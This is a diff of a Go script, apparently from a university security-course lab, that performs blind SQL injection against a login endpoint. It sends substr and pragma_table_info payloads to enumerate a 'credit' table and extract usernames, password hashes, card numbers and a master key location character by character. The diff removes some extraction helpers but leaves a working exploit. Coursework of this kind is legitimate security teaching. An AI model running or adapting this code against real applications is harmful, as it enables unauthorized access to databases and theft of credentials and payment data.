@@ -10,21 +10,6 @@ import (
 
 const baseURL = "http://cs177.seclab.cs.ucsb.edu:61964/login"
 
-// Helper function to validate and process response
-func validateResponse(body []byte) bool {
-	length := len(body)
-	fmt.Printf("Response length: %d\n", length)
-
-	// If response indicates failure (less than 3000 chars), print the body
-	if length < 3000 {
-		fmt.Println("Response body:")
-		fmt.Println(string(body))
-		return false
-	}
-	fmt.Println("Successful login")
-	return true
-}
-
 func testColumnName(position int, charPosition int, char string) bool {
 	// Test if the character at charPosition in the column name at position matches char
 	payload := fmt.Sprintf("cs177' AND (SELECT substr(name,%d,1) FROM pragma_table_info('credit') LIMIT 1 OFFSET %d)='%s'; --",
@@ -59,7 +44,6 @@ func testTableStructure() {
 
 	// Try each column position (0-6)
 	for pos := 0; pos < 7; pos++ {
-		columnName := []string{}
 		fmt.Printf("Finding column %d: ", pos)
 
 		// Try up to 20 characters per column name
@@ -67,7 +51,6 @@ func testTableStructure() {
 			found := false
 			for _, char := range chars {
 				if testColumnName(pos, charPos, string(char)) {
-					columnName = append(columnName, string(char))
 					fmt.Printf("%c", char)
 					found = true
 					break
@@ -143,114 +126,6 @@ func extractColumnValue(columnName string, rowOffset int) string {
 	return strings.Join(value, "")
 }
 
-func testPasswordHash(position int, char string) bool {
-	// Test each character of the password hash
-	payload := fmt.Sprintf("cs177' AND (SELECT substr(passwd_sha,%d,1) FROM credit WHERE uname='cs177')='%s'; --",
-		position, char)
-
-	params := url.Values{}
-	params.Add("username", payload)
-	params.Add("password", "anything")
-	params.Add("login", "Login")
-
-	fullURL := fmt.Sprintf("%s?%s", baseURL, params.Encode())
-
-	resp, err := http.Get(fullURL)
-	if err != nil {
-		fmt.Printf("Error making request: %v\n", err)
-		return false
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		fmt.Printf("Error reading response: %v\n", err)
-		return false
-	}
-
-	return len(body) > 3000
-}
-
-func extractPasswordHash() {
-	// Only hex characters for SHA hash
-	chars := "0123456789abcdef"
-
-	hash := []string{}
-	fmt.Printf("Finding password hash: ")
-
-	// SHA hash is 64 characters
-	for pos := 1; pos <= 64; pos++ {
-		found := false
-		for _, char := range chars {
-			if testPasswordHash(pos, string(char)) {
-				hash = append(hash, string(char))
-				fmt.Printf("%c", char)
-				found = true
-				break
-			}
-		}
-		// If no character matched, we've reached the end
-		if !found {
-			break
-		}
-	}
-	fmt.Println()
-}
-
-func testKeyLocation(position int, char string) bool {
-	// Test each character of the master_key_loc value
-	payload := fmt.Sprintf("cs177' AND (SELECT substr(master_key_loc,%d,1) FROM credit WHERE uname='cs177')='%s'; --",
-		position, char)
-
-	params := url.Values{}
-	params.Add("username", payload)
-	params.Add("password", "anything")
-	params.Add("login", "Login")
-
-	fullURL := fmt.Sprintf("%s?%s", baseURL, params.Encode())
-
-	resp, err := http.Get(fullURL)
-	if err != nil {
-		fmt.Printf("Error making request: %v\n", err)
-		return false
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		fmt.Printf("Error reading response: %v\n", err)
-		return false
-	}
-
-	return len(body) > 3000
-}
-
-func extractKeyLocation() {
-	// Expanded character set
-	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/._-{}!@#$%^&*()=+[]<>?,\\| "
-
-	location := []string{}
-	fmt.Printf("Finding master_key_loc value: ")
-
-	// Try exactly 20 characters
-	for pos := 1; pos <= 20; pos++ {
-		found := false
-		for _, char := range chars {
-			if testKeyLocation(pos, string(char)) {
-				location = append(location, string(char))
-				fmt.Printf("%c", char)
-				found = true
-				break
-			}
-		}
-		// If no character matched for this position, print a placeholder
-		if !found {
-			fmt.Printf("?")
-		}
-	}
-	fmt.Println()
-}
-
 /*
 Finding column 0: uname
 Finding column 1: passwd_sha256
@@ -273,6 +148,8 @@ Finding master_key_loc value: You
 */
 
 func main() {
+	testTableStructure()
+	findRowCount()
 	// Check each column for each row
 	columns := []string{"uname", "passwd_sha256", "card_no", "ty", "nom", "dt", "master_key_loc"}
 
@@ -282,46 +159,6 @@ func main() {
 			extractColumnValue(col, row)
 		}
 	}
-}
-
-func testKeyLength(length int) bool {
-	// Test if master_key_loc is of specific length
-	payload := fmt.Sprintf("cs177' AND (SELECT length(master_key_loc) FROM credit WHERE uname='cs177')=%d; --",
-		length)
-
-	params := url.Values{}
-	params.Add("username", payload)
-	params.Add("password", "anything")
-	params.Add("login", "Login")
-
-	fullURL := fmt.Sprintf("%s?%s", baseURL, params.Encode())
-
-	resp, err := http.Get(fullURL)
-	if err != nil {
-		fmt.Printf("Error making request: %v\n", err)
-		return false
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		fmt.Printf("Error reading response: %v\n", err)
-		return false
-	}
-
-	return len(body) > 3000
-}
-
-func findKeyLength() {
-	fmt.Printf("Finding master_key_loc length: ")
-	// Try lengths up to 100 (adjust if needed)
-	for length := 1; length <= 100; length++ {
-		if testKeyLength(length) {
-			fmt.Printf("%d\n", length)
-			return
-		}
-	}
-	fmt.Println("Length not found in range 1-100")
 }
 
 func testRowCount(count int) bool {
